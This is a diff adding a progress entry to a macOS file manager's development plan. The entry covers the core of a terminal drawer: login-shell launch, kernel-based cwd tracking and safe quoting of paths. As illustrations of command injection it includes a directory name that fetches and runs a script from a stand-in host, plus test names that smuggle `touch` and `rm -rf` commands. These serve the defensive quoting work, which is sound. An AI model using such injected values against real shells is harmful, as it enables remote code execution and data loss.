@@ -1359,6 +1359,99 @@ the machine** (proving it searches everywhere, like Finder's sidebar tags, not t
 unchecking View ▸ Show Tags removed the section, re-checking restored it. 590 core + 33 app tests,
 swiftformat + swiftlint-strict clean, fixtures removed.
 
+Progress (2026-07-15, M6 pass 7 — the terminal-drawer core): the pure, tested foundation of the
+drawer, the core-first opener every M4/M5/M6 slice used. Box stays `[ ]` (no drawer view, no
+SwiftTerm, no menu — this is the shell/cwd/quoting half). **Four new `DirnexCore/Services/` files,
+purely additive** (no existing-API change, so the app is untouched and needs no rebuild). User chose
+the item and the approach up front: terminal drawer next, and **SwiftTerm** (MIT, macOS 10.15+) as
+the embedded emulator — Dirnex's first third-party dependency, landing in pass 8's app target only
+(Sparkle 2 is already planned for M7, so a dep is not unprecedented; the core stays dependency-free).
+Everything below was **probed against the real thing before any Swift was written** — the pass-1
+`git` lesson — and it killed the plan's own design:
+
+- **THE FINDING: there is no shell-integration snippet, and there should not be one.** The plan
+  specced "'cd sync back' via shell integration snippet", i.e. the traditional emulator route: have
+  the user paste a hook into `~/.zshrc` that prints OSC 7 (`\e]7;file://host/path\a`) at every
+  prompt, then parse it out of the terminal's output. SwiftTerm even hands it over pre-parsed. macOS
+  ships that hook — but probing `/etc/zshrc` showed it is sourced only via
+  `[ -r "/etc/zshrc_$TERM_PROGRAM" ] && . "/etc/zshrc_$TERM_PROGRAM"`, and Apple ships only
+  `/etc/zshrc_Apple_Terminal`, so an honest drawer must ship and install its own. **The kernel
+  already knows.** `proc_pidinfo(PROC_PIDVNODEPATHINFO)` reports any same-user process's cwd, the
+  drawer's shell is our own child, and Dirnex is unsandboxed by design (§2) — so `cd` is visible with
+  **no dotfile edits, no snippet, and no cooperation from the shell**: it works on first launch, for
+  `fish`/`nushell` as well as `zsh`, and for a `cd` inside a subshell or script. **Measured at
+  0.75 µs**, so it can simply be asked whenever the terminal produces output — no timer, no polling
+  an idle app. It is also the *safer* half of the choice: OSC 7 is bytes written by whatever runs in
+  the terminal (SwiftTerm's own docs warn the contents are "entirely under the control of the remote
+  application"), so an `ssh` host or a `cat` of a crafted file could push a path at the panel; the
+  kernel cannot be talked into lying about our child's cwd. Nothing parses OSC 7 even though it is
+  free. This is the `SSH_ASKPASS` shape again — the plan predicts machinery the OS makes unnecessary.
+- **`TerminalShell.swift`** — the launch descriptor (executable, `argv[0]`, environment), pure like
+  `GitCommand`'s argv. `$SHELL` is *asked*, never assumed (this very account runs `/bin/bash`; the
+  `/bin/zsh` default is only a fallback). **`argv[0]` carries a leading dash** — that is the whole
+  login-shell mechanism, and it is why Terminal.app runs `-zsh`: without it `~/.zprofile` never runs,
+  and on a stock Mac that is where Homebrew's `shellenv` lives, so the drawer would be missing half
+  the user's tools. The dash asks for login and the pty makes it interactive, so no `-l`/`-i`.
+  **`TERM_PROGRAM` is load-bearing and naming ourselves honestly is what keeps us out of the user's
+  files**: claiming `Apple_Terminal` would buy that OSC 7 emitter at the price of everything else in
+  Apple's file — probed: with `TERM_SESSION_ID` set it creates `~/.zsh_sessions/$ID.session`,
+  repoints `HISTFILE` at a per-session file, and restores-then-deletes saved session state, i.e. the
+  drawer would quietly take over Terminal.app's session bookkeeping and split the user's history.
+  `TERM_PROGRAM=Dirnex` names us for what we are, and `/etc/zshrc_Dirnex` does not exist. The
+  inherited terminal identity (`TERM_SESSION_ID`, `ITERM_*`, `LC_TERMINAL*`) is **stripped**, because
+  Dirnex launched from a terminal (`open`, `xcodebuild`) inherits it and would hand our child
+  somebody else's session id.
+- **`ShellCommandLine.swift`** — the security-critical half, and the reason it is pure and tested: a
+  directory name is **attacker-controlled data** (unzip something from the internet and you can be
+  browsing ``$(curl evil.sh | sh)``) and it lands on the command line of an interactive shell.
+  POSIX single quotes have no escapes, so only the quote itself needs the classic `'` → `'\''`
+  bridge; **`fish` is the exception and the reason `ShellKind` distinguishes it** — its single quotes
+  *do* honour backslash escapes, so the POSIX bridge would leave a stray backslash in the path.
+  **`^U^K` before the command is a safety measure, not tidiness**: the line editor may hold a
+  half-typed command, and appending `cd …` to it would execute *their* words plus ours — someone who
+  typed `rm -rf /` and thought better of it would watch us run `rm -rf / cd -- '/x'`. Both keys are
+  needed because `bash`'s `^U` only kills *backwards* from the cursor. `cd --` ends option parsing;
+  the leading space is a courtesy to `HIST_IGNORE_SPACE` users (off by default, so what actually
+  keeps history clean is emitting **nothing** when the shell is already there — the common case).
+- **`ShellWorkingDirectory.swift`** — the two syscall reads plus the pure follow policy. `isAtPrompt`
+  is `tcgetpgrp` on the pty, which asks exactly the right question — "would my keystrokes reach the
+  shell?" — and is the gate that stops Dirnex typing a `cd` into somebody's `vim`. The policy
+  compares **resolved** paths on both sides, because a panel showing `/tmp` that tells its shell to
+  `cd -- '/tmp'` gets `/private/tmp` back and would "follow" the shell to the place it already was,
+  moving the view in response to its own message. A panel inside an archive or on SFTP never follows.
+- **`ExternalTerminal.swift`** — the item's "open in iTerm/Terminal/WezTerm as alternative" half,
+  `ExternalDiffTool`'s shape verbatim (injected `pathExists`, `installed`/`preferred`, uninstalled ⇒
+  absent from the menu rather than an error). Two launch shapes because they are genuinely different
+  programs: an app bundle via `open -a <bundle> <dir>` (Terminal, iTerm — macOS registers them as
+  folder handlers, so no shell command is typed and no quoting exists on this path) vs a CLI taking a
+  flag (`wezterm start --cwd <dir>`). Terminal.app is the always-installed fallback, `FileMerge`'s role.
++36 tests → **626 core tests** (was 590). `swift test` green, swiftformat + swiftlint-strict clean;
+app target untouched. **VERIFIED LIVE** — a throwaway harness compiled against the real core driving
+a **real login shell in a real pty** (the pass-1 method), 12/12: the kernel saw `cd` with nothing
+installed anywhere; the shell followed the panel; the **ping-pong guard held against the real
+`/tmp`→`/private/tmp` symlink** (and typed no second `cd`); a directory named ``it's a "test"
+$(touch …) `touch …` ;rm -rf boom; & |x`` was entered **verbatim with neither substitution firing**;
+`^U^K` cleared an abandoned `echo THIS_MUST_NOT_RUN` which never executed while the `cd` still
+landed; `isAtPrompt` read true idle → **false while `sleep` ran** → true again; and the shell itself
+reported `TP=Dirnex TERM=xterm-256color V=0.1-harness SESSION=[] CWDFN=[none]` — the inherited
+session id stripped and **Apple's `update_terminal_cwd` undefined, proving its dotfile was not
+sourced**. `ExternalTerminal` was driven for real too: `open -a Terminal <dir>` opened Terminal with
+its shell's cwd exactly on target (read back through this pass's own libproc route), then quit.
+GOTCHAS, both harness-only but both instructive: (1) **`fork()` in a process that has touched
+libdispatch may only `exec`** — a Swift allocation in the child (building argv/envp) SIGTRAPs, so
+every C string must be built *before* the fork; (2) a `DispatchSource` handler written in top-level
+code **inherits `@MainActor`** and then trips Swift 6's `dispatch_assert_queue` when it runs on a
+background queue — it needs `{ @Sendable in }`. (3) A near-miss worth recording: the harness's own
+first cut compared a **raw kernel path against a resolved one** and reported a failure that did not
+exist. `URL.resolvingSymlinksInPath` normalizes that pair by *stripping* `/private`, not adding it
+(`/private/tmp/x` and `/tmp/x` both → `/tmp/x`), so it agrees with the kernel only when applied to
+**both** sides — which the policy does, and a doc note now pins for pass 8, which supplies that closure.
+**NEXT (M6 pass 8, the app layer):** add SwiftTerm (v1.14.0) to the app target, a drawer
+`NSSplitViewItem` below the panes hosting `LocalProcessTerminalView` (spawned via `TerminalShell`,
+`currentDirectory:` at the active pane so opening it types nothing), cwd-follow both ways off
+`shellPid`/`childfd` on output-settle, and the `ExternalTerminal` menu items; then the
+size-visualization mode.
+
 ### M7 — Release readiness (M)
 
 - [ ] Sparkle 2 updates + appcast infrastructure; notarized DMG pipeline in CI
